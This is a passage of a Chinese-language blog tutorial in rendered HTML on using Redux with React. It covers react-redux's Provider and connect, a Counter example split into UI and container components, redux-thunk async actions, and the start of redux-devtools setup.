class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>缺点：</p>\n<p>1) redux 与 react 组件的代码耦合度太高</p>\n<p>2) 编码不够简洁</p>\n<h2 id=\"react-redux库\"><a href=\"#react-redux库\" class=\"headerlink\" title=\"react-redux库\"></a>react-redux库</h2><p>一个 react 插件库，专门用来简化 react 应用中使用 redux。</p>\n<p>React-Redux 将所有组件分成两大类：</p>\n<ul>\n<li>UI 组件<br>a. 只负责 UI 的呈现，不带有任何业务逻辑<br>b. 通过 props 接收数据(一般数据和函数)<br>c. 不使用任何 Redux 的 API<br>d. 一般保存在 components 文件夹下</li>\n<li>容器组件<br>a. 负责管理数据和业务逻辑，不负责 UI 的呈现<br>b. 使用 Redux 的 API<br>c. 一般保存在 containers 文件夹下</li>\n</ul>\n<h3 id=\"相关api\"><a href=\"#相关api\" class=\"headerlink\" title=\"相关api\"></a>相关api</h3><p><strong>Provider</strong>：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 让所有组件都可以得到 state 数据</span></span><br><span class=\"line\">&lt;Provider store=&#123;store&#125;&gt;</span><br><span class=\"line\">\t&lt;App /&gt;</span><br><span class=\"line\">&lt;<span class=\"regexp\">/Provider&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>connect()</strong>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 用于包装 UI 组件生成容器组件</span></span><br><span class=\"line\">connect(</span><br><span class=\"line\">\tmapStateToprops,</span><br><span class=\"line\">\tmapDispatchToProps</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<p><strong>mapStateToprops()</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数: 将 state 数据转换为 UI 组件的标签属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mapStateToProps</span> (<span class=\"params\">state</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    \tcount: state</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>mapDispatchToProps</strong>：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 函数: 将分发 action 的函数转换为 UI 组件的标签属性</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">mapDispatchToProps</span>(<span class=\"params\">dispatch</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    \tincrement: <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> dispatch(increment(number)),</span><br><span class=\"line\">    \tdecrement: <span class=\"function\">(<span class=\"params\">number</span>) =&gt;</span> dispatch(decrement(number)),</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 对象: 简洁语法, 可以直接指定包含多个 action 方法</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> mapDispatchToProps = &#123;</span><br><span class=\"line\">    increment,</span><br><span class=\"line\">    decrement</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"react-redux版本-1\"><a href=\"#react-redux版本-1\" class=\"headerlink\" title=\"react-redux版本\"></a>react-redux版本</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install --save react-redux</span><br><span class=\"line\"></span><br><span class=\"line\">redux/action-types.js 不变</span><br><span class=\"line\">redux/actions.js 不变</span><br><span class=\"line\">redux/reducers.js 不变</span><br><span class=\"line\">redux/store.js 不变</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// containers/App.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;connect&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Counter <span class=\"keyword\">from</span> <span class=\"string\">'../components/Counter'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement&#125; <span class=\"keyword\">from</span> <span class=\"string\">'../redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)</span></span><br><span class=\"line\"><span class=\"comment\">const mapStateToProps = (state) =&gt; (&#123;count: state&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// 指定向Counter传入哪些函数属性</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件</span></span><br><span class=\"line\"><span class=\"comment\">const mapDispatchToProps = (dispatch) =&gt; (&#123;</span></span><br><span class=\"line\"><span class=\"comment\">  increment: (number) =&gt; dispatch(increment(number)),</span></span><br><span class=\"line\"><span class=\"comment\">  decrement: (number) =&gt; dispatch(decrement(number)),</span></span><br><span class=\"line\"><span class=\"comment\">&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件</span></span><br><span class=\"line\"><span class=\"comment\">// const mapDispatchToProps = &#123;increment, decrement&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">export default connect(</span></span><br><span class=\"line\"><span class=\"comment\">  mapStateToProps,</span></span><br><span class=\"line\"><span class=\"comment\">  mapDispatchToProps</span></span><br><span class=\"line\"><span class=\"comment\">)(Counter)*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> connect(</span><br><span class=\"line\">  state =&gt; (&#123;<span class=\"attr\">count</span>: state&#125;),</span><br><span class=\"line\">  &#123;increment, decrement&#125;,</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// components/Counter.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">UI组件</span></span><br><span class=\"line\"><span class=\"comment\">  主要做显示与与用户交互</span></span><br><span class=\"line\"><span class=\"comment\">  代码中没有任何redux相关的代码</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    count: PropTypes.number.isRequired,</span><br><span class=\"line\">    increment: PropTypes.func.isRequired,</span><br><span class=\"line\">    decrement: PropTypes.func.isRequired</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.decrement(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 入口js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> ReactDOM <span class=\"keyword\">from</span> <span class=\"string\">'react-dom'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Provider &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> App <span class=\"keyword\">from</span> <span class=\"string\">'./containers/App'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> store <span class=\"keyword\">from</span> <span class=\"string\">'./redux/store'</span></span><br><span class=\"line\"></span><br><span class=\"line\">ReactDOM.render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">Provider</span> <span class=\"attr\">store</span>=<span class=\"string\">&#123;store&#125;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">  <span class=\"tag\">&lt;<span class=\"name\">App</span>/&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">Provider</span>&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'root'</span>))</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-thunk异步中间件\"><a href=\"#redux-thunk异步中间件\" class=\"headerlink\" title=\"redux-thunk异步中间件\"></a>redux-thunk异步中间件</h2><p><code>npm install --save redux-thunk</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span class=\"string\">'redux-thunk'</span> <span class=\"comment\">// 引入依赖</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> reducer <span class=\"keyword\">from</span> <span class=\"string\">'./reducer'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> createStore(reducer, applyMiddleware(thunk))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// redux/actions.js</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  异步增加的异步 action</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> incrementAsync = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">number</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 返回一个带 dispatch 参数的函数</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">dispatch</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 执行异步操作</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 有了结果后, 通过同步的increment分发 action</span></span><br><span class=\"line\">      dispatch(increment(number))</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// components/Counter.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> React, &#123;Component&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> PropTypes <span class=\"keyword\">from</span> <span class=\"string\">'prop-types'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">UI组件</span></span><br><span class=\"line\"><span class=\"comment\">  主要做显示与与用户交互</span></span><br><span class=\"line\"><span class=\"comment\">  代码中没有任何redux相关的代码</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Counter</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">static</span> propTypes = &#123;</span><br><span class=\"line\">    count: PropTypes.number.isRequired,</span><br><span class=\"line\">    increment: PropTypes.func.isRequired,</span><br><span class=\"line\">    decrement: PropTypes.func.isRequired,</span><br><span class=\"line\">    incrementAsync: PropTypes.func.isRequired <span class=\"comment\">// 引入异步方法</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props)</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.numberRef = React.createRef()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  increment = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  decrement = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.decrement(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementIfOdd = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">this</span>.props.count % <span class=\"number\">2</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.props.increment(number)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  incrementAsync = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> number = <span class=\"keyword\">this</span>.numberRef.current.value * <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\">// 使用 thunk 异步增加</span></span><br><span class=\"line\">    <span class=\"keyword\">this</span>.props.incrementAsync(number)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> count = <span class=\"keyword\">this</span>.props.count</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;div&gt;</span><br><span class=\"line\">        &lt;p&gt;click &#123;count&#125; times&lt;<span class=\"regexp\">/p&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;select ref=&#123;this.numberRef&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"1\"&gt;1&lt;/</span>option&gt;</span><br><span class=\"line\">            &lt;option value=<span class=\"string\">\"2\"</span>&gt;<span class=\"number\">2</span>&lt;<span class=\"regexp\">/option&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">            &lt;option value=\"3\"&gt;3&lt;/</span>option&gt;</span><br><span class=\"line\">          &lt;<span class=\"regexp\">/select&gt; &amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/</span>button&gt;&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.decrement&#125;&gt;-<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span>&amp;nbsp;&amp;nbsp;</span><br><span class=\"line\">          &lt;button onClick=&#123;<span class=\"keyword\">this</span>.incrementIfOdd&#125;&gt;increment <span class=\"keyword\">if</span> odd&lt;<span class=\"regexp\">/button&gt;&amp;nbsp;&amp;nbsp;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/</span>button&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/div&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>div&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// containers/App.jsx</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;connect&#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-redux'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Counter <span class=\"keyword\">from</span> <span class=\"string\">'../components/Counter'</span></span><br><span class=\"line\"><span class=\"comment\">// 将 incrementAsync 挂载到 Counter</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;increment, decrement, incrementAsync&#125; <span class=\"keyword\">from</span> <span class=\"string\">'../redux/actions'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> connect(</span><br><span class=\"line\">  state =&gt; (&#123;<span class=\"attr\">count</span>: state&#125;),</span><br><span class=\"line\">  &#123;increment, decrement, incrementAsync&#125;,</span><br><span class=\"line\">)(Counter)</span><br></pre></td></tr></table></figure>\n<h2 id=\"redux-调试工具\"><a href=\"#redux-调试工具\" class=\"headerlink\" title=\"redux 调试工具\"></a>redux 调试工具</h2><p>在<code>chrome</code>安装<code>redux-devtool</code>插件</p>\n<p>项目中下载依赖：<code>npm install --save-dev redux-devtools-extension</code></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// // redux/store.js</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;createStore, applyMiddleware&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux'</span></span><br><span class=\"line\"><span class=\"comment\">// 引入这个工具</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123;composeWithDevTools&#125; <span class=\"keyword\">from</span> <span class=\"string\">'redux-devtools-extension'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> thunk <span class=\"keyword\">from</span> <span 